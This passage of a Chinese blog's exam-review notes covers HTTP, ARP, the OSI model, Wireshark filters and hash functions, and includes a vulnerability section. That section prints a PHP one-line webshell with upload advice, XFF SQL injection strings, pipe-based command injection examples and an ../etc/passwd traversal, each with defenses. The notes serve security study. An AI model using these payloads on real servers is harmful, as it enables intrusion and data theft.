title="HTTP有什么特点？"></a><strong>HTTP有什么特点？</strong></h3><ol><li><p><strong>简单和灵活</strong>：</p><ul><li>HTTP协议使用简单的请求-响应模型，通信过程直观明了。它支持各种数据格式和内容类型，使得可以在网络上传输各种类型的数据。</li></ul></li><li><p><strong>无连接和无状态</strong>：</p><ul><li>HTTP协议是无连接的，即每次请求都是独立的，服务器不会保持与客户端的连接状态。同时，HTTP是无状态的，服务器不会保存请求之间的状态信息，每个请求都是独立的，这使得HTTP协议具有简单性和可伸缩性，但同时需要通过其他机制（如Cookie、Session）来管理用户状态。</li></ul></li><li><p><strong>基于文本</strong>：</p><ul><li>HTTP协议的请求和响应都是基于文本的，使用ASCII字符进行通信，这使得HTTP消息可以被直接查看和调试。</li></ul></li><li><p><strong>支持客户端-服务器模式</strong>：</p><ul><li>HTTP协议基于客户端-服务器模式，客户端发送请求，服务器返回响应。这种模式灵活且符合互联网应用的需求。</li></ul></li><li><p><strong>支持缓存机制</strong>：</p><ul><li>HTTP协议支持缓存机制，可以通过缓存技术减少网络传输，提高性能和用户体验。</li></ul></li><li><p><strong>扩展性</strong>：</p><ul><li>HTTP协议具有良好的扩展性，支持通过标头（Header）字段传递各种自定义信息，可以实现更复杂的功能和应用。</li></ul></li></ol><h3 id="HTTP有什么作用？"><a href="#HTTP有什么作用？" class="headerlink" title="HTTP有什么作用？"></a><strong>HTTP有什么作用？</strong></h3><ol><li><p><strong>传输网页和超文本内容</strong>：</p><ul><li>HTTP协议最基本的作用是传输网页和超文本内容。通过HTTP，浏览器可以向服务器请求网页，服务器则返回包含HTML、CSS、JavaScript等内容的响应，完成页面的展示和渲染。</li></ul></li><li><p><strong>传输各种类型的数据</strong>：</p><ul><li>除了网页，HTTP还可以传输各种类型的数据，如图像、音频、视频、文件等。HTTP支持多种内容类型和数据格式，使得互联网上的资源能够以统一的方式进行访问和传输。</li></ul></li><li><p><strong>实现客户端和服务器之间的通信</strong>：</p><ul><li>HTTP作为客户端和服务器之间的通信协议，使得客户端能够向服务器发送请求并接收响应。这种通信模式支持了各种互联网应用的实现，如浏览器访问网页、移动应用与服务器通信等。</li></ul></li><li><p><strong>支持Web应用的交互</strong>：</p><ul><li>HTTP协议支持通过请求和响应实现Web应用的交互功能，如用户登录、数据提交、状态管理等。</li></ul></li></ol><p>在网络通信中，请求头（Request Header）和响应头（Response Header）是HTTP协议中的重要部分，用于在客户端和服务器之间传递关于请求或响应的元数据信息。下面是它们的作用和常见字段的含义：</p><h3 id="请求头（Request-Header）"><a href="#请求头（Request-Header）" class="headerlink" title="请求头（Request Header）"></a>请求头（Request Header）</h3><p>请求头包含了客户端向服务器发送的请求的附加信息，这些信息描述了请求本身的性质、格式、认证信息等。常见的请求头字段包括：</p><ol><li><p><strong>User-Agent</strong></p><ul><li>含义：标识了发起请求的用户代理（通常是浏览器或应用程序）的相关信息，如操作系统、浏览器类型和版本号等。</li></ul></li><li><p><strong>Host</strong></p><ul><li>含义：指定被请求资源的主机名和端口号。</li></ul></li><li><p><strong>Accept</strong></p><ul><li>含义：指定客户端可接受的内容类型，用于服务器返回合适的响应。</li></ul></li><li><p><strong>Content-Type</strong></p><ul><li>含义：指定请求体的MIME类型，告诉服务器请求中的内容格式是什么样的。</li></ul></li><li><p><strong>Authorization</strong></p><ul><li>含义：包含用于对请求进行身份验证的凭据，通常用于发送身份验证信息（如基本认证或令牌）。</li></ul></li></ol><h3 id="响应头（Response-Header）"><a href="#响应头（Response-Header）" class="headerlink" title="响应头（Response Header）"></a>响应头（Response Header）</h3><p>响应头包含了服务器对客户端请求的响应的元数据信息，用于描述响应的属性、类型、缓存设置等。常见的响应头字段包括：</p><ol><li><p><strong>Content-Type</strong></p><ul><li>含义：指定响应体的MIME类型，告诉客户端响应的内容格式是什么样的。</li></ul></li><li><p><strong>Content-Length</strong></p><ul><li>含义：指定响应体的长度，以字节为单位。</li></ul></li><li><p><strong>Cache-Control</strong></p><ul><li>含义：控制缓存的行为，例如是否缓存响应、缓存的有效期等。</li></ul></li><li><p><strong>Set-Cookie</strong></p><ul><li>含义：在响应中设置Cookie，将会在客户端保存，用于跟踪会话状态或其他状态信息。</li></ul></li><li><p><strong>Location</strong></p><ul><li>含义：用于重定向，指示客户端应该跳转到的新位置。</li></ul></li></ol><h3 id="其他常见字段"><a href="#其他常见字段" class="headerlink" title="其他常见字段"></a>其他常见字段</h3><p>除了上述字段外，还有许多其他常见的请求头和响应头字段，用于控制和描述HTTP请求和响应的各个方面。例如：</p><ul><li><strong>Date</strong>：指定消息创建的日期和时间。</li><li><strong>Server</strong>：指示服务器的软件信息。</li><li><strong>ETag</strong>：用于缓存验证，表示资源的标识符。</li><li><strong>Referer</strong>：指示请求的来源页面 URL。</li><li><strong>Connection</strong>：控制连接的选项，如保持长连接或关闭连接等。</li></ul><p>这些请求头和响应头字段的合理设置和使用，能够有效地控制HTTP请求和响应的行为，提高通信的效率和安全性。</p><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>ARP协议的核心作用是在局域网内解析IP地址到MAC地址的映射关系，帮助设备确定数据包的接收方，从而实现有效的网络通信。</p><h2 id="DNS协议-端口号53"><a href="#DNS协议-端口号53" class="headerlink" title="DNS协议 / 端口号53"></a>DNS协议 / 端口号53</h2><p><strong>域名解析协议（DNS，Domain Name System）的用途是将域名和 IP 地址相互映射</strong></p><h1 id="二、漏洞相关"><a href="#二、漏洞相关" class="headerlink" title="二、漏洞相关"></a>二、漏洞相关</h1><p>讲讲漏洞的 <strong>成因 攻击方式/类型 预防方式</strong> </p><h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h2><p><strong>产生原因</strong><br>本质上是程序员没有遵循代码与数据分离原则 使用户数据作为代码执行 </p><blockquote><p>当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p></blockquote><p><strong>攻击方式/类型</strong><br>类型有 字符型或者数字型</p><ol><li>get注入<br>在get传参时写入参数，将SQl语句闭合，后面加写入自己的SQL语句。</li><li>post注入<br>通过post传参，原理与get一样，重要的是判断我们所输入的信息是否与数据库产生交互，其次判断SQL语句是如何闭合的。</li><li>有些网站通过查询cookie判断用户是否登录，需要与数据库进行交互，我们可以修改cookie的值，查找我们所需要的东西。或者通过报错注入是网页返回报错信息。</li><li>Referer注入<br>Referer正确写法应该是Referrer,因为http规定时写错只能将错就错，有些网站会记录ip和访问路径，例如百度就是通过Referer来统计网站流量，我们将访问路径进行SQL注入，同样也可以得到想要的信息。</li><li>XFF注入<br>在用户登录注册模块在 HTTP 头信息添加 X-Forwarded-for: 9.9.9.9’ ，用户在注册的时候，如果存在安全隐 患，会出现错误页面或者报错。从而导致注册或者登录用户失败。<br>burpsuite 抓包，提交输入检测语句：</li></ol><pre class="line-numbers language-text" data-language="text"><code class="language-text">X-Forwarded-for: 127.0.0.1'and 1=1#X-Forwarded-for: 127.0.0.1'and 1=2#//两次提交返回不一样，存在 SQL 注入漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="6"><li>UA注入：输入点在User-Agent</li></ol><p><strong>sql语句相关</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show databases; //显示数据库列表SELECT * FROM users; //检索数据insert into; //向数据表中插入新记录update; //更新表中记录delete from; //用于从数据表中删除数据create table; //创建新的数据库sum() //计算某列的总和count() //计算指定列的行数avg() min() max() abs() //平均值 最小值 最大值 绝对值TRUNCATE //清空某个表的数据drop //直接把表删了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>如何预防</strong><br>为了防止 SQL 注入攻击，可以采取以下几种防御方式：</p><ol><li><strong>使用参数化查询（Prepared Statements）</strong>：<ul><li>使用参数化查询是最有效的防御 SQL 注入的方法之一。参数化查询使用占位符（如 <code>?</code>）代替直接将用户输入嵌入到 SQL 查询中，然后将参数与查询分离，确保用户输入不会被当作 SQL 代码执行。</li></ul></li><li><strong>输入验证与过滤</strong>：<ul><li>对于用户输入的数据，进行严格的输入验证和过滤，只接受预期的数据格式和范围。例如，对于数字输入，确保只包含数字字符；对于字符串输入，可以使用白名单过滤非法字符。</li><li>在应用程序的前端和后端都进行输入验证，防止恶意输入进入系统。</li></ul></li><li><strong>最小权限原则（Least Privilege Principle）</strong>：<ul><li>遵循最小权限原则，为数据库用户分配最小必要的权限。应用程序连接数据库时，使用有限权限的数据库账号，避免使用具有过高权限的账号。</li></ul></li><li><strong>避免拼接 SQL 语句</strong>：<ul><li>避免将用户输入直接拼接到 SQL 查询语句中。即使对于动态构建的查询，也应该使用参数化查询或者安全的 ORM（对象关系映射）工具，而不是手动拼接字符串。</li></ul></li><li><strong>ORM 框架的使用</strong>：<ul><li>使用 ORM 框架（如Hibernate、Entity Framework等）可以帮助自动化地处理数据库访问和数据映射，减少手动编写 SQL 查询的机会，从而降低 SQL 注入的风险。</li></ul></li><li><strong>安全编码实践</strong>：<ul><li>培训开发人员和测试人员，提高他们对安全编码的认识，编写安全的代码和进行安全审计。</li><li>定期更新和维护应用程序和数据库系统，及时修复已知的安全漏洞。</li></ul></li><li><strong>监控与日志记录</strong>：<ul><li>实施安全监控和日志记录机制，及时发现和响应潜在的 SQL 注入攻击行为。</li></ul></li><li><strong>安全审计</strong>：<ul><li>定期进行安全审计和漏洞扫描，及时发现并修复存在的安全问题。</li></ul></li></ol><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p><strong>漏洞成因</strong></p><blockquote><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p></blockquote><p><strong>攻击方式/类型</strong><br>主要在于一句话木马的组成方式</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php eval($_POST['cmd']);?&gt;↑这就是最简单的一句话木马其中的$_POST可以替换为$_GET或者$_REQUEST分别代表POST传参 GET传参 两者皆可eval是命令执行函数其余的分别有：eval()：将字符串作为 PHP 代码执行。system()：执行系统命令并返回输出。exec()：执行外部命令。shell_exec()：执行 shell 命令并返回输出。passthru()：执行外部命令并将原始输出发送到输出。popen()：打开进程文件指针。proc_open()：执行命令并打开进程文件指针。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>随后把包含该内容的php文件上传至服务器 利用中国菜刀 蚁剑等软件连接即可</p><p><strong>防御方式</strong><br>检查文件类型 检查文件大小 传文件后更改文件名称 对文件内容进行检查与过滤</p><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p><strong>漏洞成因</strong><br>和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。</p><p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。</p><p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p><p>以PHP为例,常用的文件包含函数有以下四种<br>include(),require(),include_once(),require_once()</p><p>区别如下:</p><p><strong>require():找不到被包含的文件会产生致命错误，并停止脚本运行</strong><br><strong>include():找不到被包含的文件只会产生警告，脚本继续执行</strong><br><strong>require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</strong><br><strong>include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</strong></p><p><strong>攻击方式/类型</strong><br>分为 <strong>本地文件包含漏洞</strong> 与 <strong>远程文件包含漏洞</strong><br><strong>本地文件包含</strong>的话 可以利用绝对路径来获取账号信息 又或者读取服务器文件<br>在传参中加入若干个../与etc/passwd来看账号信息</p><p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则<strong>include/require</strong>函数是可以加载远程文件的，这种漏洞被称为<strong>远程文件包含</strong><br>这样的话可以下载远程网站的脚本 联合csrf攻击 或者执行远程代码</p><p><strong>如何防御</strong><br>本地：<strong>输入验证和过滤</strong> 限制用户访问范围 使用白名单机制限制允许包含的文件或目录列表 只允许应用程序包含受信任的文件<br>远程：关闭<code>allow_url_include</code>、<code>allow_url_fopen</code>等配置</p><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p><strong>漏洞成因</strong></p><blockquote><p>命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一<br>如PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致，可以执行命令的函数有system( )、exec( )、shell_exec( )、passthru( )、pcntl_execl( )、popen( )、proc_open( )等，当攻击者可以控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击<br>PHP执行命令是继承WebServer用户的权限，这个用户一般都有权限向Web目录写文件，可见该漏洞的危害性相当大</p></blockquote><p>假使有一个ping ip的网站 而输入框没有屏蔽; || | &amp;&amp; &amp;等管道符 导致了恶意代码的运行 这就是命令执行漏洞</p><p><strong>攻击方式/类型</strong></p><pre class="line-numbers language-none"><code class="language-none">管道符的区别WINDOWS系统支持的管道符“|”：直接执行后面的语句例如：ping www.baidu.com|whoami“||”：如果前面执行的语句执行出错，则执行后面的语句例如：ping www.baidu.com||whoami“&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假例如：ping www.baidu.com&amp;whoami或者ping www.baidu.com&amp;whoami“&amp;&amp;”：如果前面的语句为真先执行第一个命令后执行第二个命令；为假则直接出错，也不执行后面的语句例如：ping www.baidu.com&amp;&amp;whoamLINUX系统支持的管道符“；”执行完前面的命令执行后面的“|”：显示后面语句的执行结果“||”：当前面的语句执行出错时，执行后面的语句“&amp;”：如果前面的语句为假，则直接指向后面的语句，前面的语句可真可假“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般与linux命令 <strong>find</strong> 一同执行<br>find 目录(一般为/ 根目录) -name(限制条件为名称) ‘flag.txt’<br><strong>如何防御</strong><br>过滤管道符 使用白名单机制对输入内容进行限制</p><h2 id="XSS-CSRF漏洞"><a href="#XSS-CSRF漏洞" class="headerlink" title="XSS&amp;CSRF漏洞"></a>XSS&amp;CSRF漏洞</h2><p><strong>漏洞成因</strong><br>XSS：未对输入框中的内容进行严格过滤 导致恶意用户能够在网页中注入恶意的脚本代码 这些恶意脚本在被其他用户访问时会在其浏览器中执行 从而达到攻击的目的<br>CSRF：应用程序没有对用户的请求进行有效的验证和授权，攻击者可以伪装用户身份向应用程序发送恶意请求，利用用户在应用程序中的登录状态或会话。</p><h3 id="攻击类型-方式："><a href="#攻击类型-方式：" class="headerlink" title="攻击类型/方式："></a><strong>攻击类型/方式：</strong></h3><p>XSS漏洞</p><ol><li><strong>存储型 XSS</strong>：攻击者将恶意脚本存储到服务器上的数据库或文件中，当其他用户访问包含恶意脚本的页面时，恶意脚本被从服务器检索并执行。</li><li><strong>反射型 XSS</strong>：攻击者将恶意脚本作为参数包含在URL中，当用户点击包含恶意参数的链接时，恶意脚本会从URL中反射到用户的浏览器中执行。</li></ol><p>CSRF漏洞</p><ol><li><strong>基于表单的CSRF</strong>：攻击者诱使用户在已经登录的情况下访问包含恶意表单的页面，当用户提交表单时，实际上是提交了恶意请求。</li><li><strong>基于图片的CSRF</strong>：攻击者将恶意请求隐藏在图片URL中，当用户加载包含恶意图片的页面时，实际上是触发了恶意请求。</li><li><strong>基于链接的CSRF</strong>：攻击者诱使用户点击包含恶意请求的链接，以触发恶意操作。</li></ol><p><strong>防御方式</strong><br>XSS：输入验证/转义 使用安全的http标头<br>CSRF：验证用户来源 生成随机验证token</p><h1 id="三、网络相关"><a href="#三、网络相关" class="headerlink" title="三、网络相关"></a>三、网络相关</h1><p><strong>Wireshark是一款用于监听网络的软件</strong></p><ul><li><p>wireshark有三个面板：</p><ul><li>packet list面板</li><li>packet details面板</li><li>packet bytes面板</li></ul><p><img data-src="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/12.png" alt="12"></p><p>这三个面板之间是相互关联的：</p><p>如果希望在packet details面板中查看一个单独的数据包的具体内容，必须在packet list面板中单机选中那个数据包<br>选中该数据包之后，才可以通过在packet deatils面板中选择数据宝的某个字段进行分析，从而在packet bytes面板中查看相应字段的字节信息</p><h2 id="packet-list"><a href="#packet-list" class="headerlink" title="packet list"></a>packet list</h2><p>packet list面板：以表格的形式显示了当前捕获文件中的所有数据报，从下面可以看出，一共有7列：</p><p>No（Number列）：包的编号<br>    默认wireshark是按照数据包编号从低到高排序<br>    该编号不会发生改变，即使使用了过滤也同样如此<br>Time列：包的时间戳。时间格式可以自己设置<br>Source列和Destination列：包的源地址和目的地址<br>Protocol列：包的协议类型<br>Length列：包的长度<br>Info列：包的附加信息</p><p><img data-src="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/13.png" alt="13"></p><h2 id="packet-details"><a href="#packet-details" class="headerlink" title="packet details"></a>packet details</h2><p>packet details面板：分层的显示了一个数据包中的内容，并且可以通过展开或者收缩来显示这个数据包中所捕获的全部内容<br><img data-src="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/14.png" alt="14"><br>默认数据详细信息都是合并的，如果要查看，可以单击每行前面的箭头：<br><img data-src="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/15.png" alt="15"></p><h2 id="packet-bytes"><a href="#packet-bytes" class="headerlink" title="packet bytes"></a>packet bytes</h2><p>packet bytes面板：</p><ul><li>显示了一个数据包未经处理的原始样子，也就是它在链路上传播时的样子。</li><li>在该面板中的数据是以16进制和ASCII格式显示了帧的内容</li><li>当在packet details面板中选择任意一个字段后，在packet bytes面板中包含该字段的字节也高亮显示。</li></ul><p><img data-src="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/16.png" alt="16"></p></li></ul><h3 id="1-协议过滤器"><a href="#1-协议过滤器" class="headerlink" title="1. 协议过滤器"></a>1. 协议过滤器</h3><ul><li><strong>过滤特定协议</strong>：<ul><li><code>http</code>：显示所有HTTP协议的数据包。</li><li><code>tcp</code>：显示所有TCP协议的数据包。</li><li><code>udp</code>：显示所有UDP协议的数据包。</li><li><code>icmp</code>：显示所有ICMP协议的数据包。</li></ul></li></ul><h3 id="2-IP地址和端口过滤器"><a href="#2-IP地址和端口过滤器" class="headerlink" title="2. IP地址和端口过滤器"></a>2. IP地址和端口过滤器</h3><ul><li><strong>过滤源或目标IP地址</strong>：<ul><li><code>ip.addr == 192.168.1.100</code>：显示源或目标IP地址为192.168.1.100的数据包。</li></ul></li><li><strong>过滤源或目标端口</strong>：<ul><li><code>tcp.port == 80</code>：显示目标或源端口为80的TCP数据包。</li><li><code>udp.port == 53</code>：显示目标或源端口为53的UDP数据包。</li></ul></li></ul><h3 id="3-数据包方向和流量类型过滤器"><a href="#3-数据包方向和流量类型过滤器" class="headerlink" title="3. 数据包方向和流量类型过滤器"></a>3. 数据包方向和流量类型过滤器</h3><ul><li><strong>过滤数据包方向</strong>：<ul><li><code>src host 192.168.1.100</code>：显示源IP地址为192.168.1.100的数据包。</li><li><code>dst host 192.168.1.100</code>：显示目标IP地址为192.168.1.100的数据包。</li><li><code>src net 192.168.1.0/24</code>：显示源IP地址属于192.168.1.0/24子网的数据包。</li></ul></li><li><strong>过滤流量类型</strong>：<ul><li><code>tcp.flags.syn == 1</code>：显示带有TCP SYN标志的数据包（用于TCP连接建立）。</li><li><code>tcp.flags.ack == 1</code>：显示带有TCP ACK标志的数据包（用于确认）。</li></ul></li></ul><h3 id="4-组合过滤器"><a href="#4-组合过滤器" class="headerlink" title="4. 组合过滤器"></a>4. 组合过滤器</h3><ul><li><strong>组合多个条件</strong>：<ul><li><code>ip.addr == 192.168.1.100 &amp;&amp; tcp.port == 80</code>：显示源或目标IP地址为192.168.1.100且目标或源端口为80的数据包。</li><li><code>tcp.flags.syn == 1 &amp;&amp; ip.addr == 192.168.1.100</code>：显示源或目标IP地址为192.168.1.100且带有TCP SYN标志的数据包。</li></ul></li></ul><h3 id="5-其他过滤器"><a href="#5-其他过滤器" class="headerlink" title="5. 其他过滤器"></a>5. 其他过滤器</h3><ul><li><strong>过滤特定协议的字段</strong>：<ul><li><code>http.request.method == "GET"</code>：显示所有HTTP GET请求的数据包。</li><li><code>http.response.code == 200</code>：显示所有HTTP响应码为200的数据包。</li></ul></li></ul></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;从头到尾再来一遍的感觉吧&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>最新的知识点</title>
    <link href="https://www.maonie.top/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>https://www.maonie.top/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/</id>
    <published>2024-04-28T02:48:04.000Z</published>
    <updated>2024-05-06T04:55:03.174Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>考试可能会用到 谁又知道呢</p><h1 id="一、osi模型"><a href="#一、osi模型" class="headerlink" title="一、osi模型"></a>一、osi模型</h1><p>维基百科定义：</p><blockquote><p> “OSI模型，即开放式通信系统互联参考模型（Open System Interconnection Reference Model），是国际标准化组织（ISO）提出的一个试图使各种计算机在世界范围内互连为网络的标准框架，简称OSI。”</p></blockquote><p>定义了网络互连的七层模型（物理层、数据链路层、网络层、传输层、会话层、表示层、应用层）</p><span id="more"></span><h2 id="这七层分别有什么用-对应什么协议"><a href="#这七层分别有什么用-对应什么协议" class="headerlink" title="这七层分别有什么用/对应什么协议"></a><strong>这七层分别有什么用/对应什么协议</strong></h2><p>应用层：为应用程序或用户请求提供各种请求服务。OSI参考模型最高层，也是最靠近用户的一层，为计算机用户、各种应用程序以及网络提供接口，也为用户直接提供各种网络服务。</p><p>表示层：数据编码、格式转换、数据加密。提供各种用于应用层数据的编码和转换功能,确保一个系统的应用层发送的数据能被另一个系统的应用层识别。如果必要，该层可提供一种标准表示形式，用于将计算机内部的多种数据格式转换成通信中采用的标准表示形式。数据压缩和加密也是表示层可提供的转换功能之一。</p><p>会话层：创建、管理和维护会话。接收来自传输层的数据，负责建立、管理和终止表示层实体之间的通信会话，支持它们之间的数据交换。该层的通信由不同设备中的应用程序之间的服务请求和响应组成。</p><p>传输层：数据通信。建立主机端到端的链接，为会话层和网络层提供端到端可靠的和透明的数据传输服务，确保数据能完整的传输到网络层。</p><p>网络层：IP选址及路由选择。通过路由选择算法，为报文或通信子网选择最适当的路径。控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。数据链路层的数据在这一层被转换为数据包，然后通过路径选择、分段组合、顺序、进/出路由等控制，将信息从一个网络设备传送到另一个网络设备。</p><p>数据链路层：提供介质访问和链路管理。接收来自物理层的位流形式的数据，封装成帧，传送到网络层；将网络层的数据帧，拆装为位流形式的数据转发到物理层；负责建立和管理节点间的链路，通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。</p><p>物理层：管理通信设备和网络媒体之间的互联互通。传输介质为数据链路层提供物理连接，实现比特流的透明传输。实现相邻计算机节点之间比特流的透明传送，屏蔽具体传输介质和物理设备的差异。</p><p><img data-src="/blob.jpg" alt="blob"></p><h1 id="二、wireshark（主要是面板和筛选器）"><a href="#二、wireshark（主要是面板和筛选器）" class="headerlink" title="二、wireshark（主要是面板和筛选器）"></a>二、wireshark（主要是面板和筛选器）</h1><h2 id="首先讲面板"><a href="#首先讲面板" class="headerlink" title="首先讲面板"></a>首先讲面板</h2><p>wireshark有三个面板：</p><ul><li>packet list面板</li><li>packet details面板</li><li>packet bytes面板</li></ul><p><img data-src="/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/12.png" alt="12"></p><p>这三个面板之间是相互关联的：</p><p>如果希望在packet details面板中查看一个单独的数据包的具体内容，必须在packet list面板中单机选中那个数据包<br>选中该数据包之后，才可以通过在packet deatils面板中选择数据宝的某个字段进行分析，从而在packet bytes面板中查看相应字段的字节信息</p><h2 id="packet-list"><a href="#packet-list" class="headerlink" title="packet list"></a>packet list</h2><p>packet list面板：以表格的形式显示了当前捕获文件中的所有数据报，从下面可以看出，一共有7列：</p><p>No（Number列）：包的编号<br>    默认wireshark是按照数据包编号从低到高排序<br>    该编号不会发生改变，即使使用了过滤也同样如此<br>Time列：包的时间戳。时间格式可以自己设置<br>Source列和Destination列：包的源地址和目的地址<br>Protocol列：包的协议类型<br>Length列：包的长度<br>Info列：包的附加信息</p><p><img data-src="/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/13.png" alt="13"></p><h2 id="packet-details"><a href="#packet-details" class="headerlink" title="packet details"></a>packet details</h2><p>packet details面板：分层的显示了一个数据包中的内容，并且可以通过展开或者收缩来显示这个数据包中所捕获的全部内容<br><img data-src="/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/14.png" alt="14"><br>默认数据详细信息都是合并的，如果要查看，可以单击每行前面的箭头：<br><img data-src="/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/15.png" alt="15"></p><h2 id="packet-bytes"><a href="#packet-bytes" class="headerlink" title="packet bytes"></a>packet bytes</h2><p>packet bytes面板：</p><ul><li>显示了一个数据包未经处理的原始样子，也就是它在链路上传播时的样子。</li><li>在该面板中的数据是以16进制和ASCII格式显示了帧的内容</li><li>当在packet details面板中选择任意一个字段后，在packet bytes面板中包含该字段的字节也高亮显示。</li></ul><p><img data-src="/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/16.png" alt="16"></p><h1 id="三、ARP协议"><a href="#三、ARP协议" class="headerlink" title="三、ARP协议"></a>三、ARP协议</h1><h3 id="什么是ARP"><a href="#什么是ARP" class="headerlink" title="什么是ARP"></a><strong>什么是ARP</strong></h3><p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；</p><p>最直白的说法是：在IP以太网中，当一个上层协议要发包时，有了该节点的IP地址，ARP就能提供该节点的MAC地址。</p><p>大家都知道，OSI模式把网络工作分为七层，彼此不直接打交道，只通过接口(layre interface). IP地址在第三层（网络层）, MAC地址在第二层（数据链路层）。协议在发送数据包时，首先要封装第三层（IP地址）和第二层 （MAC地址）的报头, 但协议只知道目的节点的IP地址，不知道其物理地址，又不能跨第二、三层，所以得用ARP的服务拿到MAC地址。</p><h1 id="四、哈希函数"><a href="#四、哈希函数" class="headerlink" title="四、哈希函数"></a>四、哈希函数</h1><p>哈希函数（Hash Function）是一种将任意长度的数据映射到固定长度输出的算法。哈希函数常用于加密、数字签名、数据完整性验证、数据压缩等领域。</p><p>哈希函数具有以下几个特点：</p><ol><li><strong>固定输出长度</strong>：哈希函数的输出长度固定，不论输入数据的长度如何，输出长度都是固定的。</li><li><strong>单向性</strong>：哈希函数是一种单向函数，即无法从哈希值推算出原始数据。<em>这是哈希函数应用于密码学的一个关键特性。</em></li><li><strong>确定性</strong>：对于相同的输入数据，哈希函数总是会生成相同的输出值。</li><li><strong>雪崩效应</strong>：哈希函数的输入数据只要发生了微小的变化，输出值就会发生巨大的变化，这种效应被称为雪崩效应。</li></ol><p>哈希函数广泛应用于密码学中，通常用于保护数据的机密性和完整性。例如，常用的密码存储方法是将用户密码经过哈希函数处理后存储在数据库中，当用户登录时，输入的密码会被哈希函数处理后与数据库中的哈希值进行比较，从而验证密码的正确性。</p><h1 